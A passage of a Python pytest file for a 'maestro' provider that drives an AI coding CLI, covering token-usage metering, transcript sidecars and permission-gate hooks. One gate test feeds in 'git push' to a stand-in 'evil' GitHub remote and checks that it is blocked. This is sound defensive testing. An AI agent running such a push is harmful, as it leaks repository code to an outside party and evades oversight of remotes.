            sidecar_usage=_usage_block(50, 30, 10, 10),  # totals 100
            snapshots=dict(_PROBE_SNAPSHOTS),  # /cost parses 1234 tokens
        )
    assert len(_divergence_records(caplog)) == 1
    # The sidecar stays authoritative: the returned usage is the metered count.
    assert out.usage.unmetered is False
    assert out.usage.total_tokens == 100


@pytest.mark.asyncio
async def test_query_on_session_agreement_logs_nothing(
    mem_fs: dict[str, str], caplog: pytest.LogCaptureFixture,
) -> None:
    """A sidecar count matching the /cost reading logs no warning."""
    with caplog.at_level(logging.WARNING, logger="maestro.cost_tracking"):
        out = await _probed_session_turn(
            mem_fs,
            sidecar_usage=_usage_block(1000, 200, 20, 14),  # totals 1234
            snapshots=dict(_PROBE_SNAPSHOTS),  # /cost parses 1234 tokens
        )
    assert _divergence_records(caplog) == []
    assert out.usage.total_tokens == 1234


@pytest.mark.asyncio
async def test_query_on_session_no_cross_check_when_unmetered(
    mem_fs: dict[str, str], caplog: pytest.LogCaptureFixture,
) -> None:
    """An ``unmetered=True`` zero-fill is *unknown*, not a count to diverge from —
    no warning even though the probe carried a /cost reading."""
    with caplog.at_level(logging.WARNING, logger="maestro.cost_tracking"):
        out = await _probed_session_turn(
            mem_fs,
            sidecar_usage=None,  # absent sidecar → unmetered fallback
            snapshots=dict(_PROBE_SNAPSHOTS),
        )
    assert out.usage.unmetered is True
    assert _divergence_records(caplog) == []


@pytest.mark.asyncio
async def test_query_on_session_no_cross_check_when_cost_parse_missed(
    mem_fs: dict[str, str], caplog: pytest.LogCaptureFixture,
) -> None:
    """A probe whose /cost parse missed compares nothing, even against a
    metered sidecar count."""
    snapshots = dict(_PROBE_SNAPSHOTS)
    del snapshots["/cost"]  # the fake runner returns "" → parse_cost → None
    with caplog.at_level(logging.WARNING, logger="maestro.cost_tracking"):
        out = await _probed_session_turn(
            mem_fs,
            sidecar_usage=_usage_block(50, 30, 10, 10),
            snapshots=snapshots,
        )
    assert out.usage.unmetered is False
    assert _divergence_records(caplog) == []


# ── usage metering from the transcript sidecar (proposal 061 Step 10) ──────


def _assistant_line(usage: dict[str, Any] | None, *, model: Any = "claude-opus-4-8") -> str:
    """Build one assistant transcript JSONL row carrying *usage* (or none)."""
    message: dict[str, Any] = {"model": model}
    if usage is not None:
        message["usage"] = usage
    return json.dumps({"type": "assistant", "message": message})


def _usage_block(
    inp: int, out: int, cache_create: int, cache_read: int
) -> dict[str, int]:
    """A sidecar ``message.usage`` block with the four metered token counts."""
    return {
        "input_tokens": inp,
        "output_tokens": out,
        "cache_creation_input_tokens": cache_create,
        "cache_read_input_tokens": cache_read,
    }


def test_transcript_path_encodes_cwd_slug() -> None:
    """The sidecar path mirrors the CLI's on-disk layout: the cwd with every
    non-alphanumeric character replaced by ``-``, under
    ``~/.claude/projects/<slug>/<session>.jsonl``."""
    path = cli_paced._transcript_path("sess-42", "/home/u/my.proj")
    assert path == (
        Path.home() / ".claude" / "projects" / "-home-u-my-proj" / "sess-42.jsonl"
    )


def test_effective_cwd_prefers_explicit_then_process_cwd() -> None:
    """An explicit cwd wins; ``None`` resolves to the process cwd the CLI child
    would inherit."""
    assert cli_paced._effective_cwd("/work") == "/work"
    assert cli_paced._effective_cwd(None) == os.getcwd()


def test_read_sidecar_usage_sums_assistant_blocks(mem_fs: dict[str, str]) -> None:
    """Token counts sum across every assistant ``message.usage`` block; the last
    block's model is captured; blank / non-assistant / non-dict-message / no-usage
    rows are skipped."""
    path = cli_paced._transcript_path("sess-1", "/work")
    mem_fs[str(path)] = "\n".join(
        [
            "",  # blank line skipped
            json.dumps({"type": "user", "message": {"usage": _usage_block(999, 9, 9, 9)}}),
            _assistant_line(_usage_block(10, 3, 5, 7), model="claude-opus-4-8"),
            json.dumps({"type": "assistant", "message": "not-a-dict"}),
            _assistant_line(None),  # assistant row with no usage block
            _assistant_line(_usage_block(2, 1, 0, 4), model="claude-sonnet-4-6"),
        ]
    )
    usage = cli_paced._read_sidecar_usage("sess-1", "/work")
    assert usage is not None
    assert usage.input_tokens == 12
    assert usage.output_tokens == 4
    assert usage.cache_creation_tokens == 5
    assert usage.cache_read_tokens == 11
    # The last *usage-bearing* assistant row's model wins; the user row's 999
    # input tokens never count (only assistant rows meter).
    assert usage.model == "claude-sonnet-4-6"


def test_read_sidecar_usage_none_when_no_session_id() -> None:
    """No session id → no sidecar to read → honest ``None`` (never a read)."""
    assert cli_paced._read_sidecar_usage(None, "/work") is None
    assert cli_paced._read_sidecar_usage("", "/work") is None


def test_read_sidecar_usage_none_when_file_missing(mem_fs: dict[str, str]) -> None:
    """A genuinely-absent sidecar raises ``FileNotFoundError`` → honest ``None``."""
    assert cli_paced._read_sidecar_usage("absent", "/work") is None


def test_read_sidecar_usage_none_when_undecodable(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A sidecar that cannot be UTF-8-decoded (truncated mid-multibyte or written in
    another encoding) raises ``UnicodeDecodeError`` — a ``ValueError`` subclass, not
    ``OSError`` — on ``read_text``. The reader treats it as *unreadable* → honest
    ``None`` rather than letting the exception crash the turn (Step 10 contract)."""

    def _raise(self: Path, encoding: str | None = None, errors: str | None = None) -> str:
        raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")

    monkeypatch.setattr(Path, "read_text", _raise)
    assert cli_paced._read_sidecar_usage("sess-undecodable", "/work") is None


def test_read_sidecar_usage_none_when_line_malformed(mem_fs: dict[str, str]) -> None:
    """A single malformed JSON line makes the whole sidecar ambiguous → ``None``
    (a fabricated count from the readable lines would be worse than unknown)."""
    path = cli_paced._transcript_path("sess-2", "/work")
    mem_fs[str(path)] = _assistant_line(_usage_block(5, 1, 0, 0)) + "\nnot json{"
    assert cli_paced._read_sidecar_usage("sess-2", "/work") is None


def test_read_sidecar_usage_none_when_no_usage_rows(mem_fs: dict[str, str]) -> None:
    """A well-formed file with no assistant usage block meters nothing → ``None``."""
    path = cli_paced._transcript_path("sess-3", "/work")
    mem_fs[str(path)] = "\n".join(
        [
            json.dumps({"type": "user", "message": {"role": "user"}}),
            json.dumps([1, 2, 3]),  # valid JSON, not a dict
            json.dumps({"type": "assistant", "message": {"usage": None}}),  # usage not dict
        ]
    )
    assert cli_paced._read_sidecar_usage("sess-3", "/work") is None


def test_read_sidecar_usage_model_none_when_not_a_string(mem_fs: dict[str, str]) -> None:
    """A non-string ``model`` is ignored (counts still meter, model stays ``None``)."""
    path = cli_paced._transcript_path("sess-4", "/work")
    mem_fs[str(path)] = _assistant_line(_usage_block(8, 2, 0, 0), model=123)
    usage = cli_paced._read_sidecar_usage("sess-4", "/work")
    assert usage is not None
    assert usage.input_tokens == 8
    assert usage.model is None


@pytest.mark.asyncio
async def test_query_meters_from_sidecar(mem_fs: dict[str, str]) -> None:
    """A query whose transcript sidecar carries usage produces a metered
    ``QueryUsage``: real summed counts, ``unmetered=False``, and the model."""
    path = cli_paced._transcript_path("sess-q", "/work")
    mem_fs[str(path)] = _assistant_line(
        _usage_block(100, 20, 30, 40), model="claude-opus-4-8"
    )
    _install_fake(result=CLIQueryResult(response="hi", session_id="sess-q"))
    out = await CliPacedProvider().query(
        "p", options=QueryOptions(caller="evolve", cwd="/work")
    )
    assert out.usage.unmetered is False
    assert out.usage.input_tokens == 100
    assert out.usage.output_tokens == 20
    assert out.usage.cache_creation_tokens == 30
    assert out.usage.cache_read_tokens == 40
    assert out.usage.total_tokens == 190
    assert out.usage.model == "claude-opus-4-8"
    assert out.usage.caller == "evolve"
    assert out.usage.session_id == "sess-q"
    # The sidecar carries token counts, not a dollar figure — cost stays unknown.
    assert out.usage.total_cost_usd is None
    # Provider attribution (067 Step 2) rides on the metered branch too.
    assert out.usage.provider == "cli_paced"


@pytest.mark.asyncio
async def test_query_unmetered_when_sidecar_absent(mem_fs: dict[str, str]) -> None:
    """A result with a session id but no readable sidecar falls back to the
    honest ``unmetered=True`` zero-fill — never a fabricated count."""
    _install_fake(result=CLIQueryResult(response="hi", session_id="no-file"))
    out = await CliPacedProvider().query(
        "p", options=QueryOptions(caller="evolve", cwd="/work")
    )
    assert out.usage.unmetered is True
    assert out.usage.total_tokens == 0
    assert out.usage.input_tokens == 0
    assert out.usage.total_cost_usd is None
    assert out.usage.session_id == "no-file"


@pytest.mark.asyncio
async def test_query_on_session_meters_from_sidecar(mem_fs: dict[str, str]) -> None:
    """The session path meters from the sidecar keyed on the session's launch cwd
    (the cwd baked into the stored options at create time)."""
    path = cli_paced._transcript_path("sess-s", "/work")
    mem_fs[str(path)] = _assistant_line(
        _usage_block(7, 4, 0, 1), model="claude-opus-4-8"
    )
    _install_fake(result=CLIQueryResult(response="answer", session_id="sess-s"))
    provider = CliPacedProvider()
    session = await provider.create_session(options=QueryOptions(cwd="/work"))
    out = await provider.query_on_session(session, "follow", caller="evolve")
    assert out.usage.unmetered is False
    assert out.usage.input_tokens == 7
    assert out.usage.output_tokens == 4
    assert out.usage.cache_read_tokens == 1
    assert out.usage.total_tokens == 12
    assert out.usage.model == "claude-opus-4-8"
    assert out.usage.session_id == "sess-s"


# ── import-contract regression (the maestro_sdk public surface cli_paced binds) ──
#
# cli_paced.py imports its whole CLI-driving surface from maestro_sdk. That
# surface once silently drifted — mcp_config's builders moved and the top-level
# re-exports were reshuffled — while the *installed* namespace hijack (maestro's
# `include = ["maestro*"]` sweeping the sibling maestro_sdk/ into its own editable
# mapping at the project root) masked the breakage as a bare ModuleNotFoundError.
# These tests pin each seam to a concrete module boundary so a rename cannot drift
# past a green build again.


def test_cli_paced_module_imports_cleanly() -> None:
    """The provider module imports with no ModuleNotFoundError against the real
    maestro_sdk public surface (regression for the mcp_config import break)."""
    import importlib

    module = importlib.import_module("maestro.providers.cli_paced")
    assert module.CliPacedProvider is not None


def test_mcp_config_seam_resolves_to_real_callables() -> None:
    """`build_mcp_config`/`serialize_mcp_config` live in maestro_sdk.mcp_config and
    are re-exported at the package top level; both faces are the same callable."""
    import maestro_sdk
    from maestro_sdk import mcp_config

    assert callable(mcp_config.build_mcp_config)
    assert callable(mcp_config.serialize_mcp_config)
    # The submodule object is the top-level re-export — the boundary is stable.
    assert maestro_sdk.build_mcp_config is mcp_config.build_mcp_config
    assert maestro_sdk.serialize_mcp_config is mcp_config.serialize_mcp_config


def test_marker_pack_resolver_seam_resolves_to_real_callables() -> None:
    """The marker-pack resolvers live in maestro_sdk.marker_packs and are
    re-exported at the top level; both faces are the same callable."""
    import maestro_sdk
    from maestro_sdk import marker_packs

    assert callable(marker_packs.get_marker_pack)
    assert callable(marker_packs.select_marker_pack)
    assert maestro_sdk.get_marker_pack is marker_packs.get_marker_pack
    assert maestro_sdk.select_marker_pack is marker_packs.select_marker_pack


def test_query_types_and_session_seam_resolve_to_real_types() -> None:
    """QueryOptions/QueryResult come from maestro_sdk.types and Session from
    maestro_sdk.session; all three are classes the provider binds by name."""
    import maestro_sdk
    from maestro_sdk import session as session_mod
    from maestro_sdk import types as types_mod

    assert isinstance(maestro_sdk.QueryOptions, type)
    assert isinstance(maestro_sdk.QueryResult, type)
    assert isinstance(maestro_sdk.Session, type)
    assert maestro_sdk.QueryOptions is types_mod.QueryOptions
    assert maestro_sdk.QueryResult is types_mod.QueryResult
    assert maestro_sdk.Session is session_mod.Session


def test_slash_probe_parser_seam_resolves_to_real_callables() -> None:
    """The slash-probe parsers cli_paced imports live in maestro_sdk.slash_probe
    and are re-exported at the top level; both faces are the same callable."""
    import maestro_sdk
    from maestro_sdk import slash_probe

    for name in ("parse_context", "parse_cost", "parse_usage"):
        top = getattr(maestro_sdk, name)
        sub = getattr(slash_probe, name)
        assert callable(sub)
        assert top is sub


def test_run_gate_bash_hook_denies_gh_api_pulls_input_body() -> None:
    """Issue #4097 across the cli_paced seam: a ``gh api`` create-PR call whose
    body arrives via ``--input`` is denied by the subprocess replica too."""
    env = allowed_branches_to_env(frozenset({"maestro/task/x"}))
    stdin = io.StringIO(json.dumps(
        {"tool_name": "Bash",
         "tool_input": {"command": "gh api repos/o/r/pulls --input pr.json"}},
    ))
    stdout = io.StringIO()
    assert run_gate_bash_hook(stdin, stdout, env) == 0
    verdict = json.loads(stdout.getvalue())
    assert verdict["hookSpecificOutput"]["permissionDecision"] == "deny"


@pytest.mark.asyncio
async def test_query_output_format_reask_forgets_prior_turn_fire() -> None:
    """#4112: a structured re-ask is a fresh turn — a prefix the predicate fired
    on in turn 1 must not trim turn 2's (non-firing) response."""
    responses = ["P\nnot json", 'P\n{"ready": true}']
    captured: dict[str, Any] = {}

    class _Client:
        async def query(self, prompt: str, *, options: Any = None) -> Any:
            if not captured.get("fired"):
                captured["fired"] = True
                assert captured["options"].complete_on("P\nnot js") is True
            return CLIQueryResult(response=responses.pop(0))

    def factory(options: CLIQueryOptions, command: Any = None, env: Any = None) -> Any:
        captured["options"] = options
        return _Client()

    cli_paced._client_factory = factory
    out = await CliPacedProvider().query(
        "decide",
        options=QueryOptions(output_format=_OUTPUT_FORMAT),
        complete_on=lambda _m, text: text == "P\n",
    )
    assert out.structured_output == {"ready": True}
    assert responses == []


def test_tool_policy_flags_emit_resolved_surfaces() -> None:
    """Seam-resolved surfaces map onto the CLI's enforcing ``--tools`` flag."""
    from maestro.config import Config
    from maestro.providers.cli_paced import _tool_policy_flags
    from maestro.sdk import QueryOptions
    from maestro.tool_surface import resolve_call_options

    cfg = Config(context7_mcp_enabled=False)
    tool_free = resolve_call_options(QueryOptions(caller="propose_plan"), cfg)
    assert _tool_policy_flags(tool_free) == [
        "--tools", "", "--disallowedTools", "Agent", "Monitor",
    ]

    repo = resolve_call_options(
        QueryOptions(caller="execute_step", hooks={"PreToolUse": [object()]}), cfg,
    )
    assert _tool_policy_flags(repo) == [
        "--tools", "Bash", "Edit", "Glob", "Grep", "Read", "TaskOutput",
        "TaskStop", "Write", "--disallowedTools", "Agent", "Monitor",
    ]


# ── tool-surface transcript sidecar (proposal 142) ──────────────────────

_LOG_DIR = Path("/fake/sdk_logs")


def _tool_use_line(name: Any, tool_input: Any) -> str:
    """One assistant CLI-transcript row carrying a ``tool_use`` block."""
    block = {"type": "tool_use", "id": "t1", "name": name, "input": tool_input}
    return json.dumps({"type": "assistant", "message": {"content": [block]}})


def _tool_result_line(content: Any, *, is_error: bool = False) -> str:
    """One user CLI-transcript row carrying a ``tool_result`` block."""
    block = {
        "type": "tool_result", "tool_use_id": "t1",
        "content": content, "is_error": is_error,
    }
    return json.dumps({"type": "user", "message": {"content": [block]}})


def _enable_transcripts() -> None:
    sdk_mod.configure_sdk_logging(_LOG_DIR)
    sdk_mod.configure_sdk_transcripts(True)


def _sidecars(mem_fs: dict[str, str]) -> list[Any]:
    """Every Maestro sidecar written under the log dir, in write order."""
    return [
        transcript.parse(text)
        for key, text in mem_fs.items()
        if key.startswith(str(_LOG_DIR)) and key.endswith(".jsonl")
    ]


def _turns(record: Any) -> list[tuple[str, str]]:
    return [(t.kind, t.content) for t in record.turns]


@pytest.mark.asyncio
async def test_query_writes_tool_surface_sidecar(mem_fs: dict[str, str]) -> None:
    """A one-shot turn writes one sidecar: caller, unknown advertised surface,
    and prompt → tool_call → tool_result → text in order."""
    _enable_transcripts()
    path = cli_paced._transcript_path("sess-t", "/work")
    mem_fs[str(path)] = "\n".join([
        _tool_use_line("Monitor", {"command": "ls"}),
        _tool_result_line([{"type": "text", "text": "ok"}]),
    ])
    _install_fake(result=CLIQueryResult(response="done", session_id="sess-t"))
    await CliPacedProvider().query(
        "p", options=QueryOptions(caller="implement_plan", cwd="/work"),
        system="sys",
    )
    records = _sidecars(mem_fs)
    assert len(records) == 1
    record = records[0]
    assert record.caller == "implement_plan"
    assert record.tools_advertised is None
    assert record.mcp_servers_advertised is None
    assert _turns(record) == [
        ("prompt", "p"),
        ("tool_call", "Monitor input={'command': 'ls'}"),
        ("tool_result", "ok"),
        ("text", "done"),
    ]


@pytest.mark.asyncio
async def test_query_sidecar_prefixes_errored_result(mem_fs: dict[str, str]) -> None:
    """An ``is_error`` tool result is recorded with the ``ERROR `` prefix."""
    _enable_transcripts()
    path = cli_paced._transcript_path("sess-e", "/work")
    mem_fs[str(path)] = _tool_result_line(
        "No such tool available: Bash", is_error=True
    )
    _install_fake(result=CLIQueryResult(response="r", session_id="sess-e"))
    await CliPacedProvider().query("p", options=QueryOptions(cwd="/work"))
    assert _turns(_sidecars(mem_fs)[0])[1] == (
        "tool_result", "ERROR No such tool available: Bash"
    )


@pytest.mark.asyncio
async def test_query_on_session_records_only_own_rows(mem_fs: dict[str, str]) -> None:
    """Each session turn records only the rows appended since the last turn;
    a changed CLI session id restarts the cursor at row 0."""
    _enable_transcripts()
    path = cli_paced._transcript_path("sess-a", "/work")
    mem_fs[str(path)] = _tool_use_line("Read", {"n": 1})
    client, _ = _install_fake(
        result=CLIQueryResult(response="one", session_id="sess-a")
    )
    provider = CliPacedProvider()
    session = await provider.create_session(options=QueryOptions(cwd="/work"))
    await provider.query_on_session(session, "first", caller="evolve")
    mem_fs[str(path)] += "\n" + _tool_use_line("Grep", {"n": 2})
    await provider.query_on_session(session, "second", caller="evolve")
    other = cli_paced._transcript_path("sess-b", "/work")
    mem_fs[str(other)] = _tool_use_line("Glob", {"n": 3})
    client._result = CLIQueryResult(response="three", session_id="sess-b")
    await provider.query_on_session(session, "third", caller="evolve")
    records = _sidecars(mem_fs)
    assert len(records) == 3
    calls = [
        [c for k, c in _turns(r) if k == "tool_call"] for r in records
    ]
    assert calls == [
        ["Read input={'n': 1}"], ["Grep input={'n': 2}"], ["Glob input={'n': 3}"],
    ]


@pytest.mark.asyncio
async def test_no_sidecar_when_logging_unconfigured(mem_fs: dict[str, str]) -> None:
    """With no SDK log dir configured, no sidecar (and no log) is written."""
    _install_fake(result=CLIQueryResult(response="r", session_id="sess-n"))
    await CliPacedProvider().query("p", options=QueryOptions(cwd="/work"))
    assert not any(k.startswith(str(_LOG_DIR)) for k in mem_fs)


@pytest.mark.asyncio
async def test_no_sidecar_when_transcripts_disabled(mem_fs: dict[str, str]) -> None:
    """Logging on but transcripts off writes only the ``.log``."""
    sdk_mod.configure_sdk_logging(_LOG_DIR)
    sdk_mod.configure_sdk_transcripts(False)
    _install_fake(result=CLIQueryResult(response="r", session_id="sess-n"))
    await CliPacedProvider().query("p", options=QueryOptions(cwd="/work"))
    assert not any(k.endswith(".jsonl") and k.startswith(str(_LOG_DIR)) for k in mem_fs)
    assert any(k.endswith(".log") and k.startswith(str(_LOG_DIR)) for k in mem_fs)


@pytest.mark.asyncio
async def test_sidecar_without_cli_transcript_has_no_tool_rows(
    mem_fs: dict[str, str],
) -> None:
    """An absent CLI transcript still records the prompt and text turns, on
    both the one-shot and the session path."""
    _enable_transcripts()
    _install_fake(result=CLIQueryResult(response="r", session_id="missing"))
    provider = CliPacedProvider()
    await provider.query("p", options=QueryOptions(cwd="/work"))
    session = await provider.create_session(options=QueryOptions(cwd="/work"))
    await provider.query_on_session(session, "s")
    assert [_turns(r) for r in _sidecars(mem_fs)] == [
        [("prompt", "p"), ("text", "r")],
        [("prompt", "s"), ("text", "r")],
    ]
    assert session.transcript_rows_seen == 0


@pytest.mark.asyncio
async def test_raising_turn_writes_no_sidecar(mem_fs: dict[str, str]) -> None:
    """A turn whose CLI call raised records nothing."""
    _enable_transcripts()
    _install_fake(error=MaestroSDKError("boom"))
    with pytest.raises(SDKError):
        await CliPacedProvider().query("p", options=QueryOptions(cwd="/work"))
    assert _sidecars(mem_fs) == []


def test_sidecar_tool_turns_skips_malformed_blocks() -> None:
    """Non-string names, non-list contents, unshaped results, non-dict blocks,
    and unrelated rows are skipped rather than guessed at."""
    rows = [
        json.loads(_tool_use_line(7, {})),
        {"type": "assistant", "message": {"content": "text only"}},
        {"type": "assistant", "message": "nope"},
        {"type": "user", "message": {"content": ["bare", {"type": "text"}]}},
        json.loads(_tool_result_line({"not": "shaped"})),
        {"type": "system"},
        json.loads(_tool_use_line("Edit", {"a": 1})),
    ]
    assert cli_paced._sidecar_tool_turns(rows) == [
        ("tool_call", "assistant", "Edit input={'a': 1}"),
    ]


def test_load_sidecar_rows_drops_non_object_rows(mem_fs: dict[str, str]) -> None:
    """Non-object JSON rows are dropped; blank lines are ignored."""
    path = cli_paced._transcript_path("sess-r", "/work")
    mem_fs[str(path)] = '[1]\n\n{"type": "user"}\n'
    assert cli_paced._load_sidecar_rows("sess-r", "/work") == [{"type": "user"}]


def test_cli_paced_sidecar_feeds_tool_surface_sensor(mem_fs: dict[str, str]) -> None:
    """End-to-end bind: a ``cli_paced`` sidecar discovered and parsed through
    ``logs.iter_transcript_records`` (the sensor's read chokepoint, including
    its date-dir/``*.jsonl`` discovery) measures as advertised-unknown with
    executed drift."""
    _enable_transcripts()
    rows = [
        json.loads(_tool_use_line("Monitor", {"command": "ls"})),
        json.loads(_tool_result_line("No such tool available: Bash", is_error=True)),
    ]
    cli_paced._record_transcript("implement_plan", "p", "done", rows)
    written = [Path(k) for k in mem_fs if k.startswith(str(_LOG_DIR))]
    sidecar = MagicMock()
    sidecar.name = next(p.name for p in written if p.suffix == ".jsonl")
    sidecar.read_text.return_value = mem_fs[
        next(str(p) for p in written if p.suffix == ".jsonl")
    ]
    date_dir = MagicMock()
    date_dir.name = written[0].parent.name
    date_dir.is_dir.return_value = True
    date_dir.__lt__ = lambda a, b: a.name < b.name
    date_dir.glob.side_effect = lambda pattern: (
        [sidecar] if pattern == "*.jsonl" else []
    )
    log_dir = MagicMock()
    log_dir.exists.return_value = True
    log_dir.iterdir.return_value = [date_dir]
    assert written[0].parent.parent == _LOG_DIR
    records = [r for _, r in iter_transcript_records(log_dir)]
    report = tool_surface.measure_tool_surface_drift(records)
    (drift,) = [c for c in report.callers if c.caller == "implement_plan"]
    assert drift.advertised_unknown == 1
    assert drift.mcp_servers_advertised_unknown == 1
    assert drift.off_surface_executed == {"Monitor": 1}
    assert drift.refusals == {"Bash": 1}


def test_record_transcript_unopenable_log_dir_keeps_turn(
    mem_fs: dict[str, str], monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A log dir that cannot be opened drops the sidecar instead of raising
    out of an already-completed turn."""
    def _boom(caller: str | None) -> None:
        raise OSError("read-only fs")

    monkeypatch.setattr(cli_paced, "open_session_logger", _boom)
    cli_paced._record_transcript("evolve", "p", "r", [])
    assert not any(k.startswith(str(_LOG_DIR)) for k in mem_fs)


def test_record_transcript_logs_prompt_line(mem_fs: dict[str, str]) -> None:
    """The human ``.log`` carries the prompt line, matching the anthropic path."""
    _enable_transcripts()
    cli_paced._record_transcript("evolve", "hello prompt", "r", [])
    (log_text,) = [
        v for k, v in mem_fs.items()
        if k.startswith(str(_LOG_DIR)) and k.endswith(".log")
    ]
    assert "Prompt: hello prompt" in log_text


@pytest.mark.asyncio
async def test_query_on_session_shrunk_transcript_restarts_cursor(
    mem_fs: dict[str, str],
) -> None:
    """A CLI transcript rewritten shorter than the cursor restarts at row 0
    rather than silently dropping every later tool row."""
    _enable_transcripts()
    path = cli_paced._transcript_path("sess-s", "/work")
    mem_fs[str(path)] = "\n".join([
        _tool_use_line("Read", {"n": 1}), _tool_use_line("Grep", {"n": 2}),
    ])
    _install_fake(result=CLIQueryResult(response="r", session_id="sess-s"))
    provider = CliPacedProvider()
    session = await provider.create_session(options=QueryOptions(cwd="/work"))
    await provider.query_on_session(session, "first")
    mem_fs[str(path)] = _tool_use_line("Glob", {"n": 3})
    await provider.query_on_session(session, "second")
    calls = [
        [c for k, c in _turns(r) if k == "tool_call"] for r in _sidecars(mem_fs)
    ]
    assert calls[-1] == ["Glob input={'n': 3}"]
    assert session.transcript_rows_seen == 1


@pytest.mark.asyncio
async def test_query_on_session_lost_session_id_keeps_cursor(
    mem_fs: dict[str, str],
) -> None:
    """A turn that captures no session id leaves the cursor alone, so a
    captured -> None -> captured sequence never re-records earlier tool rows."""
    _enable_transcripts()
    path = cli_paced._transcript_path("sess-l", "/work")
    mem_fs[str(path)] = _tool_use_line("Read", {"n": 1})
    client, _ = _install_fake(
        result=CLIQueryResult(response="r", session_id="sess-l")
    )
    provider = CliPacedProvider()
    session = await provider.create_session(options=QueryOptions(cwd="/work"))
    await provider.query_on_session(session, "first")
    client._result = CLIQueryResult(response="r", session_id=None)
    await provider.query_on_session(session, "second")
    assert session.transcript_session_id == "sess-l"
    assert session.transcript_rows_seen == 1
    mem_fs[str(path)] = "\n".join([
        _tool_use_line("Read", {"n": 1}), _tool_use_line("Grep", {"n": 2}),
    ])
    client._result = CLIQueryResult(response="r", session_id="sess-l")
    await provider.query_on_session(session, "third")
    calls = [
        c for r in _sidecars(mem_fs) for k, c in _turns(r) if k == "tool_call"
    ]
    assert calls == ["Read input={'n': 1}", "Grep input={'n': 2}"]


# --- proposal 157 W1: push-remote scoping across the seam ---------------------


def test_push_remotes_env_round_trip() -> None:
    from maestro.providers.cli_paced_gate import (
        GATE_PUSH_REMOTES_ENV,
        push_remotes_from_env,
        push_remotes_to_env,
    )

    remotes = frozenset({"origin", "acme/tool"})
    encoded = push_remotes_to_env(remotes)
    assert encoded == {GATE_PUSH_REMOTES_ENV: '["acme/tool", "origin"]'}
    assert push_remotes_from_env(encoded) == remotes
    assert push_remotes_to_env(None) == {}
    assert push_remotes_from_env({}) is None


@pytest.mark.parametrize("raw", ["not json", '{"a": 1}', "[1, 2]"])
def test_push_remotes_malformed_fails_closed(raw: str) -> None:
    from maestro.providers.cli_paced_gate import GATE_PUSH_REMOTES_ENV, push_remotes_from_env

    assert push_remotes_from_env({GATE_PUSH_REMOTES_ENV: raw}) == frozenset()


def test_build_gate_settings_unscoped_is_byte_identical() -> None:
    from maestro.providers.cli_paced_gate import GATE_PUSH_REMOTES_ENV

    branches = frozenset({"maestro/task/t1"})
    assert build_gate_settings(branches, False, None, None) == build_gate_settings(branches)
    assert GATE_PUSH_REMOTES_ENV not in build_gate_settings(branches).get("env", {})
    scoped = build_gate_settings(branches, False, None, frozenset({"origin"}))
    assert scoped["env"][GATE_PUSH_REMOTES_ENV] == '["origin"]'
    assert json.loads(
        serialize_gate_settings(branches, False, None, frozenset({"origin"}))
    ) == scoped


def test_run_gate_bash_hook_denies_foreign_push_from_env() -> None:
    from maestro.providers.cli_paced_gate import push_remotes_to_env

    env = {
        **allowed_branches_to_env(frozenset({"maestro/task/t1"})),
        **push_remotes_to_env(frozenset({"origin", "acme/tool"})),
    }
    stdin = io.StringIO(json.dumps(
        {"tool_name": "Bash",
         "tool_input": {"command": "git push https://github.com/evil/x.git maestro/task/t1"}},
    ))
    stdout = io.StringIO()
    assert run_gate_bash_hook(stdin, stdout, env) == 0
    reason = json.loads(stdout.getvalue())["hookSpecificOutput"]["permissionDecisionReason"]
    assert reason.startswith("Blocked (push-remote-foreign)")


def test_gate_helpers_pass_push_remotes_through() -> None:
    from maestro.providers.cli_paced import _gate_env, _gate_settings_flags
    from maestro.providers.cli_paced_gate import GATE_PUSH_REMOTES_ENV

    branches = frozenset({"maestro/task/t1"})
    scoped = QueryOptions(hooks=make_task_tool_hooks(
        branches, allowed_push_remotes=frozenset({"origin"}),
    ))
    assert _gate_env(scoped)[GATE_PUSH_REMOTES_ENV] == '["origin"]'
    assert json.loads(_gate_settings_flags(scoped)[1])["env"][GATE_PUSH_REMOTES_ENV] == '["origin"]'
    unscoped = QueryOptions(hooks=make_task_tool_hooks(branches))
    assert GATE_PUSH_REMOTES_ENV not in _gate_env(unscoped)
